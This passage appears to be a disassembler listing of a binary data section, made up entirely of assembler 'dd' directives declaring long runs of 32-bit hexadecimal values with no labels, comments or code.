		dd 0E478FF7Fh, 0EF703B06h, 0A42220C0h, 3BEBA193h, 4B2F6B78h
		dd 0F357724Dh, 0E1414ACEh, 3069CE76h, 62B3077Fh, 0EE8FCCA3h
		dd 1A892BE3h, 1B8B80A6h, 59CD55B1h, 7D7601FAh, 0FDBF003Bh
		dd 9D0C0A75h, 2F86D7AFh
		dd 1D861B76h, 0DF70E45Fh, 0F6C5184Dh, 185259D5h, 0F163D178h
		dd 0BD9CE8C6h, 3312EC28h, 9C383236h, 2E759A2h, 3499D01Fh
		dd 45D312B3h, 531B408h,	0BE52EC69h, 0B771DA27h,	0AB4E09E1h
		dd 9C14A8Fh, 0E5BDDD61h, 0E6076DFDh, 34CF4DEEh,	0EE020A6h
		dd 4F827B9Fh, 781D8C4Ch, 6E1C8967h, 6890BCA5h, 0D2CC0288h
		dd 0B0478DF5h, 66142E64h, 6C628C1Dh, 1A1F9D52h,	0F362BFE5h
		dd 40E55D15h, 5CA9AB25h, 934A1AF0h, 0BBF527CFh,	0BCF835A7h
		dd 9CB72A1Bh, 2B641DCAh, 96D69271h, 67BE1968h, 7688D8B0h
		dd 5122BDB8h, 0AA080DE3h, 1C7EB478h, 826F6994h,	0E6766567h
		dd 0BC78C5B2h, 936035E6h, 0C04F301Ah, 4B587453h, 5A58537Dh
		dd 0B46D2EF8h, 0EB9F8109h, 8E3A7B9Bh, 9B1C6382h, 0E1E0BD9Eh
		dd 0EDDCED3Dh, 0DD31BAA5h, 43CAFDB0h, 3D47A489h, 0DC307ED7h
		dd 7AF35D2Bh, 0BEAEBAC3h, 0D2E56B7Fh, 1579B530h, 75F45782h
		dd 0F5A32E6h, 0A3846265h, 0DA8BC2B9h, 6EF13E07h, 5E826F1Ah
		dd 0C3AE09Fh, 0A6D89DA6h, 0D2F606D2h, 7E3AB79Bh, 0BC2D07C5h
		dd 0A30F9333h, 2AD6DEAAh, 43FF7BD9h, 0E225E9EEh, 9754E470h
		dd 1D505206h, 0E522DDBDh, 3DB74CE1h, 66045FCEh,	0D88AFD40h
		dd 7B2AFC50h, 20D75DFCh, 916BF4ACh, 17A97019h, 0EAB38DFBh
		dd 0D95E44BBh, 54DAC53Ch, 94B340B7h, 0A90A6338h, 0D26F2CEFh
		dd 7522D60Bh, 0A06A043h, 7D5D77F4h, 284C19D4h, 2254EF37h
		dd 39371A62h, 0FBEA54Fh, 87138FE6h, 7AC7175Dh, 0A157B248h
		dd 0FEACF88Eh, 83A84E2Eh, 4404CAFFh, 1DC762B6h,	0D1E0ECF0h
		dd 0CD3C629Fh, 7AA3190Dh, 5E242620h, 84218E89h,	0B5BC6D4Ah
		dd 51C56EC7h, 6C1B264Bh, 84CBDFE9h, 80F71C2Eh, 0CBA39EE0h
		dd 144D1810h, 188227F9h, 632E6B1Ah, 9B56E6CFh, 0C76598F3h
		dd 961EC8BFh, 122B922Ah, 0B6C80CADh, 8EAD862Ch,	300FAF44h
		dd 0C2D567C8h, 0F5C2D72Ch, 2B48DCD4h, 476CDD8Eh, 0BFC4B547h
		dd 0BCA32ACCh, 1A88194h, 376A3FA3h, 51A1B530h, 70B7F35Bh
		dd 0C832A6AFh, 1CF3A846h, 0A8628B8Ah, 2F520626h, 6CDF0043h
		dd 0F062F75Dh, 71E1A8F5h, 67C4E22Dh, 7EDD1985h,	294FC723h
		dd 0A5A3DAE9h, 0D2CB79CCh, 0E380E068h, 0F75F1A53h, 0C35B8793h
		dd 0FA95A60Eh, 1BDA3993h, 0C14A7312h, 72A0187Bh, 85D764C2h
		dd 0C5FA135Bh, 1BDE878Dh, 0CD4180B3h, 6C6844F6h, 17E9C8D0h
		dd 977F41AEh, 44C4CA08h, 2BDB418Ch, 2EFF3F8Dh, 62445CE6h
		dd 0C3EE0271h, 41C1A371h, 77907B37h, 0E325858Bh, 0C9635E5h
		dd 0B5D3BB93h, 5DEA14DBh, 29175BBh, 0A9598BF7h,	195E7986h
		dd 0D5B62003h, 0F9D955B7h, 8D21954Ah, 72D3AAD9h, 8ADAA0A3h
		dd 97194580h, 0E6867633h, 0B6AC2AB8h, 0A9168D43h, 0DFDE5E43h
		dd 0B53900FEh, 0C7C92055h, 33E658FCh, 426E60E8h, 2FDB3F9Ch
		dd 1CB7D963h, 999AC6B3h, 126C344Dh, 0F148CFDDh,	8DB1482Ch
		dd 0F1AEF097h, 0D1874CB7h, 8E5E5C87h, 0E2F43D97h, 2BBF10A4h
		dd 0D7C629C2h, 0B94A3E8Ch, 0C9AE1516h, 2C2C3CADh, 34053FA1h
		dd 427C4D0Eh, 65793088h, 0CC706F19h, 16B78942h,	8DB507E9h
		dd 0C82278B0h, 8894FC78h, 25887502h, 5FE97312h,	0C1FB74E5h
		dd 62070BE7h, 0F7553F42h, 0AC9AA8CCh, 0AD6760F5h, 0A3A014DFh
		dd 7235E2B2h, 930D5EB2h, 0E35B32CCh, 0E68ED126h, 0A0850C98h
		dd 4F463AD5h, 0DE6BF80Bh, 5B5BADh, 0C1667001h, 94EDEF06h
		dd 0DC0A3F24h, 19A25410h, 0C4FD209Bh, 0D3A96A31h, 26ADCD36h
		dd 0D2322954h, 24BC513Ch, 44603577h, 9DC919CCh,	5D80DCAh
		dd 598FDEBEh, 2D9E4741h, 7D08B7A6h, 0A7E0CC5Dh,	0EAF8E4DFh
		dd 9875E6E0h, 0C444C792h, 2CA02616h, 37C38773h,	0D9EEC548h
		dd 3E495630h, 0B4956F15h, 1A4F0690h, 5AD8A087h,	5EDA8D6Eh
		dd 983A1B6Dh, 30966C43h, 0BDDD9013h, 912AE991h,	0ADB97FE2h
		dd 3A90B2A2h, 0BD9013C6h, 0FDB6483Eh, 12ADF855h, 65BA41E7h
		dd 5384E3ABh, 0CD9AD43Dh, 0E06ED7B4h, 8A5236BCh, 78F64C9Ch
		dd 0DDE629C5h, 285B7E3Fh, 179B9998h, 7718619Dh,	0ED26A006h
		dd 0A9FE09DCh, 154F2A82h, 10AB5177h, 846114D7h,	0BC4E9ACAh
		dd 0A8054DD0h, 146007EAh, 1BD84515h, 0C684DA28h, 0E24F59AAh
		dd 0AE106503h, 426A10BCh, 4891FF27h, 20F41C86h,	9B8290B7h
		dd 0B8E60470h, 2D6704B6h, 0DCBF0E89h, 99D50D94h, 1623A18h
		dd 48D2B9ECh, 12114AD8h, 96BC7C5h, 3D6EC71Dh, 2DAD1113h
		dd 9B2A24F2h, 0D404E9D9h, 0AF770CAFh, 1B7B0CCAh, 92B8BB34h
		dd 0CE0F10F7h, 3FFE07A9h, 845D8726h, 930C9655h,	0BD4F7AC9h
		dd 5FF2CEC5h, 40B5D34Eh, 7D29BA6Fh, 0AA22337Bh,	0C6AC0958h
		dd 5AC2BF34h, 0EE73BB37h, 635F3D3Eh, 27254BF0h,	243CE34Fh
		dd 0F6AD1EACh, 477FFD98h, 51DCE11h, 5C8B95EEh, 7D2877CEh
		dd 0DC5E4257h, 70B7BC3Fh, 8108B7CFh, 81FFE1CDh,	4D45644Eh
		dd 0EF3E2A70h, 57E8365Bh, 0B12A4492h, 627DF434h, 0D9851CFBh
		dd 0B0DBE1F0h, 955A7839h, 24B6CE17h, 0FEB2A8FDh, 733369A8h
		dd 3D1C24DFh, 0CCA55CE5h, 216856BFh, 7C0A1ECDh,	1B70FF2Dh
		dd 0C7FF0111h, 47874399h, 1C6006EDh, 626A6B7Fh,	574DF980h
		dd 0B8108A21h, 76C3DC9Eh, 0FCC974D1h, 2A40C7E2h, 0B81DFD6Dh
		dd 95E63E50h, 0C07D7D27h, 331A2C16h, 0C9480860h, 0F576FB0Bh
		dd 0A577514Eh, 0D27A3B12h, 0BEA98707h, 12E227D5h, 8C1A6924h
		dd 4CF391h, 0D5995B68h,	13C69381h, 95C9E0B6h, 986B35E4h
		dd 4B5B50D1h, 734332D4h, 0FB865D71h, 34B70D55h,	429FBAD5h
		dd 0C120EF35h, 5F98F896h, 5527175Bh, 6DF8B3D0h,	50D08EB3h
		dd 0E50CA7DEh, 8038ECD0h, 81D81AF6h, 0CFCF3CFBh, 7C19FFB1h
		dd 8A5AEDF6h, 0AE6990Ah, 0ABAD77E1h, 0E410C845h, 580BF705h
		dd 0FDA77BC3h, 0CBC2B339h, 0D51C2F96h, 92D65E07h, 22DEED6Eh
		dd 2CDDA96Eh, 0F0233B87h, 714FA4E7h, 0E158C72Ch, 96B7FFC6h
		dd 7C40A258h, 4E6A00B8h, 8504767Bh, 77ECE4E2h, 49AE4DFFh
		dd 3663CBC7h, 204143A1h, 2A1FD06Ah, 0E338740h, 8D94700Ch
		dd 8395219Bh, 0CA883AD8h, 8810DA29h, 6774F8F0h,	70B0104Bh
		dd 202B4C49h, 9D0D42BCh, 7A7EEA52h, 0FBBCF980h,	725A7A88h
		dd 3354B135h, 0CE1E151Bh, 9ED542B9h, 58E9E8Dh, 51C16D11h
		dd 0DFB8EC04h, 0F36E8215h, 0E6CEDF49h, 0B12EC3EDh, 0EEA5A2E8h
		dd 4F7B9B61h, 6B78EAEh,	1C4DA330h, 0E7637D92h, 4D9A04D9h
		dd 4447F137h, 0CFB8F8E9h, 9172D2ABh, 9B8A2B1Fh,	0E35B6392h
		dd 2AD12171h, 0DD9900FEh, 7ACE51CAh, 4B89F54Dh,	7E155C97h
		dd 6DBC8FFAh, 0D2874A8h, 9B18767Ch, 69BB1C6Ah, 19489892h
		dd 0F209832Ch, 0C1CBDCF9h, 2FC8510h, 28EBC05Fh,	5F640584h
		dd 5FE97E1Eh, 0C5FB754Ah, 93777668h, 83FB1281h,	0CDFB9AE5h
		dd 2CECB3E3h, 0E26914E3h, 2190C5EEh, 0BDD11DC1h, 0E419ED95h
		dd 25CB94B9h, 0C2ADB68Bh, 5F0F537Fh, 6E1ADD53h,	35F6C200h
		dd 2D11B5D3h, 0C19D5783h, 0E6CEDDEh, 0C6B73830h, 0E597D158h
		dd 0AE9CAFA5h, 0BDB86207h, 0B2CA82ECh, 0A506C57Ah, 0D993B4B2h
		dd 0CD78316Ch, 0EC3F4A9Fh, 0E897C749h, 0EEC65DA0h, 0F44C8F10h
		dd 64AB2D26h, 0E0FB8210h, 9DEC79C1h, 0DB52EB13h, 6F2D3EBBh
		dd 42B61F93h, 2180FB3Bh, 88140B76h, 0FF7E2EABh,	6969A358h
		dd 0B47D7523h, 1AC57E1Ch, 0C6BD6F2h, 0EDB3D4D4h, 0F1153B95h
		dd 0E92DD99Fh, 0EB296740h, 0BE9E1EA3h, 63836640h, 0CA216778h
		dd 3D8BFDA7h, 0C5BC520Fh
		dd 6F80FAF8h, 0C797B4Dh, 0CE86408Fh, 0DC55B52Ah, 70D53A3Bh
		dd 604439F3h, 0BFBB91A9h, 0E717BFD9h, 81CA20E3h, 0EDD21D5Bh
		dd 89D9C122h, 0A0013307h, 46134000h, 9F240E6Bh,	3EEB2698h
		dd 0F1048D86h, 73B837B4h, 423D3C11h, 0CE488827h, 0AB6647D1h
		dd 0D53270F0h, 993E74BEh, 0F1476AE7h, 0C0C67A5Ah, 4F6A97D0h
		dd 9E38778h, 0CEDADC5Eh, 69FFD14Ch, 94E585EBh, 77D0B0D9h
		dd 573817E2h, 0F723FAE7h, 9250E5ABh, 0C01BEB19h, 0ABD44F70h
		dd 0ADF7559Fh, 689125E9h, 0F4D14519h, 0AE34D3BDh, 0A127D36Ch
		dd 54BFC477h, 39324EAEh, 14AF9793h, 14CEAE84h, 78D361C8h
		dd 11EBA189h, 7D6FE5CDh, 0B1F0B32Bh, 6AFC90F6h,	0DC7C02Ah
		dd 0B2521A39h, 4CEE2A81h, 0F91AECBEh, 0DB6F8F14h, 66BCE85Fh
		dd 4A25B65Fh, 441DBFD3h, 719CECDEh, 0E1179413h,	4D1C3F0Bh
		dd 43D88FA8h, 5EF8634Ch, 9253C388h, 5DE2B751h, 370A9C2Ah
		dd 966FB06Dh, 9A33684h,	7A5CB1E1h, 6229DCBDh, 0AA7F6D8Ch
		dd 9DFF64E2h, 6DD10DB0h, 5935A780h, 1B65C429h, 47571CA9h
		dd 748C6226h, 0EE0C90ECh, 0A35EE36Eh, 5CDF4EFDh, 1680B81Eh
		dd 0B3242B15h, 6B714769h, 2F31223Ah, 6109B9DBh,	0A0660361h
		dd 8AE1F1B3h, 3402D390h, 0F46FE22Fh, 0F3610D52h, 64F8295h
		dd 0AEE7E31Dh, 18150988h, 0A2D087E2h, 68FEAAF2h, 5861017h
		dd 5A08EAC5h, 20289EAh,	0CDB46905h, 0F9A7444h, 0A19B8F37h
		dd 5966B36Bh, 0A5F7B81Ch, 9466AA06h, 0B3018147h, 926A538Ah
		dd 43BDBEEh, 0CCF2F2BEh, 0DA528E5h, 66E72CBBh, 3F375016h
		dd 0D57A7BAAh, 0EEC0CA21h, 413B0B6Ch, 0E8B070B2h, 60462B9Dh
		dd 7735DF61h, 0D237F55h, 9BCFBA7Ah, 9605ED3Dh, 7EA7059h
		dd 0A7A730E1h, 87694FE3h, 8130907Ah, 10A01632h,	7311FEBCh
		dd 834422B3h, 0B551218Dh, 0BBD03A37h, 5B6FC596h, 6BD1806Dh
		dd 14917065h, 1740A96Ah, 469C8D38h, 1002761h, 82E0BB7Dh
		dd 0AA3AEB2Bh, 9E6E29h,	9A3769D1h, 0F4A33AE5h, 74157577h
		dd 0E07CD61Ah, 86174578h, 0DFB758AFh, 0D0153076h, 0B66D11E1h
		dd 0B7D0172Bh, 0CF3A2BF0h, 29AF62C7h, 0D7D92340h, 6F6563D8h
		dd 551D5312h, 452A1111h, 0ADA57E1h, 8E69EEBDh, 280473EEh
		dd 1FC1B96Ch, 0F6F29CE3h, 0A046D93Ch, 0B5F3DDDh, 791B77E5h
		dd 732676A7h, 0DDC78B84h, 0C9CD466Dh, 0D7A87B51h, 8A262DD0h
		dd 0DA624333h, 26154FB7h, 82009127h, 0DEC79B68h, 0AB2F335Eh
		dd 9C423F2Eh, 0A30A10C9h, 7528A35Ch, 93F9AFEDh,	2FA1860h
		dd 0EFFD8867h, 24794715h, 8355E041h, 0A2B7875Eh, 0A3A487B9h
		dd 1C1FE062h, 3C8DA2A3h, 0F61BBC4Ch, 82342703h,	0D1330426h
		dd 1C48E75Fh, 0C3A1954Ah, 3DB2CFE0h, 4942665Bh,	0B46A7FA2h
		dd 5FC445D7h, 0C7CCD5CBh, 0C5DA1608h, 51D8F49Ch, 0AA1A8B94h
		dd 46FDF6CFh, 0A522A5EBh, 31127A83h, 0CF8B00EEh, 3C96C018h
		dd 33831D79h, 85182A04h, 0E81D1488h, 0C34154Eh,	7ED1AE43h
		dd 85A6E6ADh, 8BCF6466h, 1A7448BAh, 0D1C7D909h,	21EBCE6Ch
		dd 7B8F6A05h, 97E071FEh, 2890527Dh, 8235CAD2h, 22A7B763h
		dd 84653909h, 5419E59Fh, 19BB8A91h, 91ADB94Ch, 0ECCF2ECCh
		dd 973CD6A0h, 0F7801A54h, 0BE709020h, 6D94AE4Fh, 5C9FF142h
		dd 2DA76A07h, 0F7CC35AFh, 0A0B26971h, 0C4FC20C3h, 850AFF4Fh
		dd 7BCFA2E7h, 0F1D67320h, 52A3BC78h, 0A4400AB6h, 7DC5D868h
		dd 550611B2h, 9DC4691Eh, 0E93EE7EFh, 0F79017Eh,	0F8C6D817h
		dd 0C41C74F7h, 0BF700E1Fh, 4C90ADBBh, 1C1515C3h, 3CB1DE90h
		dd 0C1DF0640h, 0A72858D5h, 202A805Fh, 0B492D4F1h, 0AEEF272Ah
		dd 40D61061h, 0EA2995EAh, 52DE011Eh, 0FAEDD900h, 217D5835h
		dd 1A721D4Ah, 63BA78DAh, 2E285BEFh, 0E13F276Ch,	31317FA5h
		dd 0A86E99Eh, 20DE46BBh, 0B12B8F80h, 0FABB7245h, 0CAA39969h
		dd 0C4675CB3h, 935C29CBh, 0CC82CEE5h, 957E1C6h,	0B98BCD8Eh
		dd 3B962939h, 9C384961h, 0D3BC17ABh, 8BBEC2A2h,	88692546h
		dd 8361DDC4h, 48E1B68Fh, 8B123670h, 49621BE5h, 1C495DDEh
		dd 0DC18DDA6h, 0FB81D135h, 0C60A1561h, 4223A4F4h, 9CCE7AAAh
		dd 0F0C0F77Ch, 4016C482h, 0ABBD219Eh, 0F98BC055h, 0C1E7A82Bh
		dd 6F2003A6h, 0D943BA11h, 0F1EC3BA6h, 0C6576C12h, 79648902h
		dd 45F20951h, 0C0162E76h, 9130EEB3h, 0E9E1CD8Bh, 7E534CC5h
		dd 81B32048h, 31074BDAh, 56CED903h, 76A2E3ADh, 36709A08h
		dd 0A5C0C203h, 3A353CBCh, 81B0CABAh, 3321180h, 522E1FDAh
		dd 0A419F960h, 0A6D0D14h, 49531416h, 7B2F3620h,	1057279h
		dd 0DF4F7DA1h, 0B42EAD90h, 9CE9668Ah, 96A33B47h, 3B9FFD08h
		dd 0B8B2E9A1h, 0CB2B10E3h, 0EC03115Dh, 0C47231B1h, 51112ECAh
		dd 0FEE50C7Eh, 0EB3C97B8h, 25C35AC6h, 77E83DFBh, 217C9930h
		dd 3C6F8FCEh, 3F74DCFh,	0D1B80221h, 0CBAC64A2h,	0D1B5922Fh
		dd 40AA51FAh, 0DCEF6F9Dh, 9CB95126h, 1C0DCD57h,	0A51F1E60h
		dd 3EE105ADh, 0F7A9822Fh, 6335512Ch, 33EE6FA2h,	9B81F5C0h
		dd 74BC82B9h, 63EE97F9h, 0D2989C80h, 88DF0F3Ah,	4747FF97h
		dd 980A113Ch, 1F85DF17h, 3915C34Ah, 1BC8045Ah, 50087922h
		dd 509E5F47h, 2586FA91h, 549DA547h, 43A18E40h, 0F82EE691h
		dd 699C5DCDh, 0BF37FF4Dh, 0B58DDF35h, 6F356D5Ch, 3E098971h
		dd 0A6B5082Bh, 34343232h, 3F6F5409h, 5EBFE610h,	0E582B321h
		dd 207CE231h, 0C91E4E77h, 0E8E05312h, 5D1002A4h, 6E0C9325h
		dd 523F3B8Ah, 0F9E6B136h, 4CD8D785h, 0D2C0B551h, 124B797Dh
		dd 8E7D2DB7h, 7E82C9ACh, 7408659Fh, 0D68EEFB0h,	2CEB74E5h
		dd 593ECF34h, 0B5FD2ADCh, 0F22CCFA9h, 81AB122h,	801D7E27h
		dd 0B9400E6Bh, 0FF0CDAD1h, 0AD9012F8h, 0A64C65ACh, 1BF085ABh
		dd 0A15C1859h, 0EE11B3E2h, 66084371h, 36C48B32h, 2C69F71Ch
		dd 0C1C9209Ch, 7F954452h, 0AEB9D989h, 6C7F5C83h, 0EE54A884h
		dd 6D2BEB66h, 4AAB24B5h, 0D8B3B5Dh, 2F9DD30Bh, 77C24AA8h
		dd 62A4D97Fh, 0EC363586h, 493E2304h, 0A93E3Ch, 7C18261Ch
		dd 145D608Ah, 2FBBA5E1h, 80B51162h, 147FA66Dh, 0C7F19C0Fh
		dd 0C64C5F60h, 10924180h, 24B49F8Eh, 5CA1ECB9h,	5285F1EAh
		dd 5D1E780Ch, 7D1CE4E0h, 4B0FBA43h, 0E49250AAh,	8DAB5032h
		dd 0B683A7AEh, 27C8D42Eh, 2D5B9F77h, 0C0619C97h, 0EAAC7A37h
		dd 0B17F2426h, 4624E1AFh, 6972649h, 19922D59h, 0EF63E40Dh
		dd 0A236883Ah, 0D5579521h, 0F35BB3Eh, 0A92FABD8h, 745FC55h
		dd 0F5D32F60h, 0A6027770h, 86FD9BD7h, 3B3273FDh, 0A8D3E169h
		dd 0E21125EFh, 4109A9ABh, 89EDA31Ah, 0E29F6E89h, 9A07D4F9h
		dd 255568BAh, 196C5094h, 0B1EF365Dh, 0F0282E08h, 893620B5h
		dd 832302A8h, 180C5643h, 37FB8487h, 0C5862283h,	112EB3BFh
		dd 3DD876A3h, 0CD15CE77h, 5BC4B0A2h, 0B64C4BE9h, 0D4EB4FCAh
		dd 0F2D10B5Ah, 0A4C5E2B7h, 3FAFB47Eh, 0AC07CC21h, 0D740553h
		dd 22402342h, 1389D02Ah, 94C0FF26h, 784F37BEh, 84E5803Bh
		dd 0E85C61F9h, 10C769E5h, 4877C41Ch, 0B17ADBDFh, 32251B1Dh
		dd 4AECB7ECh, 0D85ABEB9h, 441FA415h, 5621DE71h,	0CC288D59h
		dd 0E2B41EE7h, 8CD713C6h, 47265AE9h, 0F4460E25h, 939697D9h
		dd 93267C17h, 3CCB064Ch, 3DC4C25Ch, 504E28A0h, 0C642DF28h
		dd 0C24A14E9h, 70F9C4F5h, 73A893BEh, 7BC3FD65h,	0BE1ADC87h
		dd 6FBFAF0Bh, 0D8E48BCDh, 34E8C6F5h, 72322498h,	5CEBF0F0h
		dd 8B712B3Bh, 0F7AAB0CEh
		dd 61D738FDh, 59481A06h, 0E24A49B1h, 0A9FE36CCh, 491A7989h
		dd 93154446h, 0DAB319EEh, 0FAEBA398h, 0DA59B1E8h, 0BD540EDFh
		dd 44217A88h, 98656FCFh, 0EB0D7815h, 2445DCCCh,	6100F40Ch
		dd 0F6F9D340h, 8B80AC0Dh, 30F2D22Ch, 0EFEB7AE4h, 85CF30C3h
		dd 0F4EE8E54h, 8A296BFCh, 53215863h, 4D6B52Dh, 7B27C746h
		dd 1A83AEE8h, 0A06D8702h, 935D5522h, 0E908EA75h, 0F874DF9h
		dd 9EE4E777h, 0C2B59BA4h, 8E4BE2DFh, 736704DDh,	0A0063C66h
		dd 22F28184h, 6A58317Bh, 21456FFCh, 0AE7037BEh,	50C97F18h
		dd 4150FA95h, 12148B2Ch, 14CB6804h, 4174617Fh, 5A51A402h
		dd 0AFC9D0B1h, 9B738423h, 9B37F6F3h, 0A6436E7h,	0E37FF7ECh
		dd 7256708Ah, 5035EB1Bh, 58069570h, 0BA33F84Ah,	77B9B3D7h
		dd 6A7223D4h, 1019E0E6h, 0E30FD1D4h, 363787A9h,	0B895970Dh
		dd 0BF29010Bh, 310662F1h, 0CD5AF1ECh, 1003846Eh, 4B606918h
		dd 0FBF1C699h, 19F4A9ABh, 0BC24A23Ah, 3DF19AC8h, 8DA8EB4Fh
		dd 48737990h, 0B1802C5Ah, 0C67A0461h, 9424BFB0h, 54665017h
		dd 0F916A6ADh, 0A8A35800h, 75BA4129h, 0A6F71B1Dh, 66F5BB3Fh
		dd 0F69F55CCh, 6216E554h, 16BE394Fh, 68D85AF1h,	47FCD19Bh
		dd 391D4CB5h, 0E6642E10h, 46FB012Bh, 51FE5AAAh,	1D94263Fh
		dd 0B8CC57ABh, 5500DBF7h, 42ED89E8h, 584C4ECh, 596A4B7h
		dd 0D8FD4725h, 61EDEB07h, 3D0441F9h, 34E24743h,	96BD3341h
		dd 4F496B8Ah, 6DB0BA99h, 739EF216h, 5255A8A2h, 44DC305Bh
		dd 11BD12CDh, 16328010h, 7422D686h, 0FBE669BCh,	419A10DFh
		dd 0FB414585h, 72A228DEh, 808C689Eh, 2A7D8017h,	84991E3Ch
		dd 759E59CFh, 45DE24FCh, 4885B652h, 0E20A7BFh, 61CE4B8Ch
		dd 0F73B2D0Eh, 7D63551Fh, 0E6A51CC8h, 8225A6DDh, 1495560Eh
		dd 35976751h, 73E894CEh, 70C77882h, 0C62ABE7Dh,	0B857895Eh
		dd 0F3622204h, 4C2F0A81h, 0BBDEE007h, 5F4489Bh,	7DFFAh
		dd 0BD37263Dh, 0A04D99E8h, 72EDD73Ch, 66E0DB16h, 3B6A3AD0h
		dd 8C8001CDh, 0C7C31132h, 38A1647Dh, 66F53A0Ch,	0CFCAC5F3h
		dd 0F0127716h, 4F9CBA78h, 6AA7A181h, 6331AD4Fh,	9AE7BD0Eh
		dd 697A0DEAh, 60A67B0Eh, 0A2A853C1h, 91CAE6B3h,	0EAA0733Bh
		dd 52998116h, 5A7D7C6Fh, 7CD4230Eh, 0C0FF3A54h,	0F111C922h
		dd 916BF494h, 4AC9E57Bh, 8CAD9CA3h, 0DE8D8D19h,	9502F23Ch
		dd 395B3E14h, 5D19A7EEh, 5DE235A1h, 53C4114Fh, 0EE2C0E68h
		dd 9F183677h, 4D5C0E23h, 2519AD2Dh, 947E6B7Ch, 0BD02B16Ah
		dd 2FC5B529h, 0F624F901h, 19C9CFA6h, 8D01F70Bh,	3E221121h
		dd 7ADEF03Ch, 0A99E2EA5h, 0FD78F8A6h, 0F77082FCh, 6D5D3B58h
		dd 173778DAh, 677D1753h, 0FE7664CAh, 15EFD4E4h,	0BE3B2C81h
		dd 7879F22h, 44280827h,	0F688E5B3h, 0FB7098EFh,	66DA6F00h
		dd 469836A6h, 74D6893Ch, 0D660449Dh, 0FEAF4EBh,	47E49980h
		dd 338EAAB6h, 0E80F54D8h, 0ACCF46D7h, 0EAE3DEEBh, 0FCA35EF6h
		dd 0C225D27Dh, 0FCF2EBA0h, 0E4F0B544h, 0EA110794h, 0A0ABCD71h
		dd 0B6F88141h, 9EDCA861h, 905E3221h, 2AA19453h,	28394544h
		dd 0DC54A5A8h, 12E3B8AAh, 480A9D1Bh, 0C048A6D1h, 8B9B6198h
		dd 9E6A67EBh, 43458B1Ah, 0B8F9CF05h, 665C0181h,	13D72EF4h
		dd 3B5A1AA2h, 184D85E6h, 0C537208Fh, 41BE8CF9h,	0E29E2FE0h
		dd 0B4E66739h, 0EF651B26h, 0DEEBD0BBh, 0DD589C89h, 76B5B7A4h
		dd 40B55932h, 2517613Ch, 0D62808ABh, 259C8634h,	0BFDAC8AAh
		dd 6385469h, 29E0F3FFh,	81B54856h, 0DC07FAF8h, 0D980128Bh
		dd 0C7DEC026h, 9AD5CD80h, 0F3424AE1h, 468AF9CFh, 97776C8Ch
		dd 0A139C491h, 3B94C8D3h, 1B215A03h, 866E6012h,	0BE15F432h
		dd 4BADE76Dh, 3F22646Dh, 7E2E5153h, 0B0FA35C1h,	0FF6C2D7h
		dd 0A6CF3A54h, 22FAB154h, 0DF93F272h, 1B6F8AE0h, 6FC49C37h
		dd 21151345h, 1A393855h, 0E63F8826h, 5B243EACh,	7E1D074Dh
		dd 0F3B1E0FAh, 0AD27C340h, 0F8233D49h, 607B3B3h, 0D6F56A26h
		dd 0E523A963h, 24FB2FCAh, 671E546Bh, 0DE001F40h, 4EE2E96Bh
		dd 0AE016E56h, 30B1D226h, 20751C3Ch, 0C316A562h, 0F1F17FA1h
		dd 0E30ADF26h, 0ACA7C806h, 0DE94C441h, 37520925h, 0D9A53E02h
		dd 92B6FC99h, 0FF6F462h, 0DA6F5138h, 0FA0B8CD7h, 2D328BD1h
		dd 9661FEABh, 42EB3C2Fh, 8AA66D67h, 3BB55DB4h, 6F1CA94Fh
		dd 358A7BDh, 7B09DE7Eh,	17063415h, 0B77DDB0Dh, 3EE11F80h
		dd 0C2B51EF5h, 4027954Eh, 0B3EB4417h, 91362C1Fh, 0B5D4F6B0h
		dd 0B3A66E25h, 9FEA9175h, 0BD54351Ah, 6D4343B9h, 3D7B5018h
		dd 3DE9064Ah, 0AC7B9225h, 0A4E7CF08h, 291575F3h, 3298C683h
		dd 0BD06D657h, 9ED027E9h, 87F65C17h, 0A8108F81h, 0F13D7676h
		dd 0ED213F43h, 0D379133Bh, 8FA8E426h, 0B24EDDA7h, 0FB74A6E1h
		dd 8056827Ah, 43042ABAh, 7215E22h, 113A94C2h, 9F8A682Eh
		dd 0C26634BDh, 3ECC3F4Fh, 0EC10C250h, 21AC3067h, 0B4D163EFh
		dd 0E60792FDh, 804AB412h, 311F444Bh, 0AA92644h,	281CCCA1h
		dd 0EB3B6FFCh, 7EAD9414h, 0D4869B23h, 344B261Fh, 8E3DB026h
		dd 0A0A6E45Bh, 0F55188BEh, 27C591EFh, 0AE76CD19h, 69781317h
		dd 0E51CCC45h, 84AA5440h, 4B3392D6h, 593C5830h,	8BF3791Dh
		dd 3F7512BDh, 390E1764h, 0C70C2E41h, 0CA9957C2h, 71E03CC8h
		dd 32713948h, 0F00F478Ah, 891947DDh, 0D8BEF9D3h, 384DF645h
		dd 2AC77657h, 862838C5h, 0FB74600h, 70EA3FC7h, 8DC2B800h
		dd 7059ADB0h, 391B3905h, 0B187D87Eh, 0D0A41139h, 0E20185CFh
		dd 254B44A8h, 5328B125h, 0DED919DFh, 25A14C3Dh,	4D47001Fh
		dd 0DEF27FDEh, 0F31BD2BDh, 0D68518E0h, 0BE8C67CFh, 369DF465h
		dd 1280E139h, 4D2C0C83h, 1A96DFE4h, 612B855Ah, 4E2848FCh
		dd 9090FA9Bh, 890F6251h, 87EDD8B5h, 0A0EEACF4h,	7CC90EF7h
		dd 16F0329Eh, 0DDE17427h, 9DBF099Fh, 60235FA4h,	0B3CF1532h
		dd 73B337FFh, 6DF6549Bh, 5F02BCF0h, 0F863E61Dh,	6103CC5h
		dd 0F6C3364Fh, 26CB2D5Fh, 0EC4436D7h, 5BF76101h, 1F04A188h
		dd 0B913ADB6h, 0F4A2C8AEh, 0D332CC64h, 99C56F7Ah, 0EB48795Fh
		dd 2F159C21h, 8C39CDEEh, 17C8A383h, 0ADA55599h,	994276F7h
		dd 0B58E82F0h, 0E685D6E8h, 0D72C3C0h, 8F721C37h, 79D0AF1Dh
		dd 0BC19DFB1h, 24B784C5h, 5147D97Ch, 8044D625h,	0BD0B12D8h
		dd 26D76C9h, 346D7A24h,	49654CE5h, 0FC78FC5Eh, 0A8AC1CB1h
		dd 0F4A1FBE4h, 3D96CCA7h, 0FBFAFB07h, 304A8B54h, 7A243F13h
		dd 0A8FEB26Eh, 38623EFBh, 0C4B59201h, 16E99003h, 2B98A152h
		dd 3CB0CA67h, 37605399h, 0A229E7BFh, 0D0A397C2h, 1685D80Ch
		dd 0A4F30EA8h, 767D574Dh, 0DBF00118h, 8680FF71h, 0E4F3CDC8h
		dd 0EFBCE515h, 1B645C15h, 0A4935933h, 324ED425h, 0AD0C1B22h
		dd 0D1D416D9h, 36F7A62Ah, 0E3A4EDE0h, 2B8F3596h, 5EC02632h
